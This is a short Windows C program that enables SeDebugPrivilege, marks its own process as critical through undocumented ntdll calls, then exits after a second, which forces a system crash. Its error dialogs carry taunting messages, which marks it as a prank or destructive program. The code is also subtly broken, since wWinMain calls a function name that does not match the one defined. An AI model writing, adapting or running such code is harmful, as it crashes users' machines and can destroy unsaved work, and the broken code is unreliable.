#include <windows.h> 
#include <winternl.h> 

BOOL
WINAPI 
SetProcessAsCriticalProcess(VOID) 
{
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN blEnable, BOOLEAN blCurrentThread, PBOOLEAN pblEnabled);
	NTSTATUS(NTAPI * RtlSetProcessIsCritical)(BOOLEAN blNew, PBOOLEAN pblOld, BOOLEAN blScb);

	NTSTATUS ntValue;
	ULONG ulBreakTermination;
	BOOLEAN blUnused;
	HMODULE hNtdll;

	hNtdll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (PVOID)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege)
	{
		ntValue = RtlAdjustPrivilege(20 /* SeDebugPrivilege */, TRUE, FALSE, &blUnused);
		if (ntValue)
		{
			MessageBoxW(NULL, L"You... You beat me.", L"Error detected", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
			ExitProcess(0);
			return FALSE;
		}
	}
	else 
	{
		MessageBoxW(NULL, L"Okay.. You win.", L"Error Detected", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
		ExitProcess(0);
		return FALSE;
	}

	if (RtlSetProcessIsCritical) 
	{
		ulBreakTermination = 1;
		ntValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntValue) 
		{
			MessageBoxW(NULL, L"You won alright?", L"Error Detected", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
			ExitProcess(0);
			return FALSE;
		}
	}
	else 
	{
		MessageBoxW(NULL, L"Please...", L"Error Detected", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
		ExitProcess(0);
		return FALSE;
	}

	return TRUE;
}

INT
WINAPI
wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR pszCmdLine,
	_In_ INT nShowCmd
)
{
	SetProcessCritical();
        Sleep(1000);

	ExitProcess(0);
        return FALSE;
}